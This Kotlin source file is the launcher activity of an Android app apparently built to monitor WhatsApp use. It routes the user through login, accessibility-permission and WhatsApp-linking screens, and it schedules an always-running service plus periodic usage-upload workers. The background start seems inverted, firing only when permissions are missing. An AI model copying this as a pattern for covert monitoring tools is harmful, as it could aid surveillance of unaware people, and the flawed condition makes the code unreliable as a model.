package com.example.whatseye

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.whatseye.access.AccessibilityPermissionActivity
import com.example.whatseye.api.managers.JwtTokenManager
import com.example.whatseye.noLogin.LoginOrSingup
import com.example.whatseye.profile.ProfileActivity
import com.example.whatseye.services.AlwaysRunningService
import com.example.whatseye.utils.areAllPermissionsGranted
import com.example.whatseye.whatsapp.WhatsAppLinkActivity
import com.example.whatseye.worker.RetryUploadWorker
import com.example.whatseye.worker.TokenRefreshWorker
import com.example.whatseye.worker.UsageWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    @SuppressLint("NewApi")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val tokenManager = JwtTokenManager(this)
        // If user is logged in and permissions are incomplete, start background services
        if (tokenManager.getIsLogin() && !areAllPermissionsGranted(this)) {
            startBackgroundServices()
            setupWorkManagerTasks()
        }

        // Decide which screen to launch next
        val nextIntent = when {
            !tokenManager.getIsLogin() -> Intent(this, LoginOrSingup::class.java)
            !areAllPermissionsGranted(this) -> Intent(this, AccessibilityPermissionActivity::class.java)
            !tokenManager.getIsLoginWhatsApp() -> Intent(this, WhatsAppLinkActivity::class.java)
            else -> Intent(this, ProfileActivity::class.java)
        }

        nextIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        startActivity(nextIntent)
        finish()
    }

    private fun startBackgroundServices() {
        val serviceIntent = Intent(this, AlwaysRunningService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel()
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    @SuppressLint("NewApi")
    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "AlwaysRunningServiceChannel",
            "Service en arrière-plan",
            NotificationManager.IMPORTANCE_HIGH
        )
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    private fun setupWorkManagerTasks() {
        val workManager = WorkManager.getInstance(applicationContext)

        val usageWorkRequest = PeriodicWorkRequestBuilder<UsageWorker>(15, TimeUnit.MINUTES).build()
        workManager.enqueueUniquePeriodicWork(
            "UsageDataSyncWork",
            ExistingPeriodicWorkPolicy.REPLACE,
            usageWorkRequest
        )

        val retryUploadRequest = PeriodicWorkRequestBuilder<RetryUploadWorker>(15, TimeUnit.MINUTES).build()
        workManager.enqueueUniquePeriodicWork(
            "RetryUploadsWork",
            ExistingPeriodicWorkPolicy.REPLACE,
            retryUploadRequest
        )

        val tokenRefreshRequest = PeriodicWorkRequestBuilder<TokenRefreshWorker>(48, TimeUnit.HOURS).build()
        workManager.enqueueUniquePeriodicWork(
            "TokenRefreshSyncWork",
            ExistingPeriodicWorkPolicy.REPLACE,
            tokenRefreshRequest
        )
    }

}
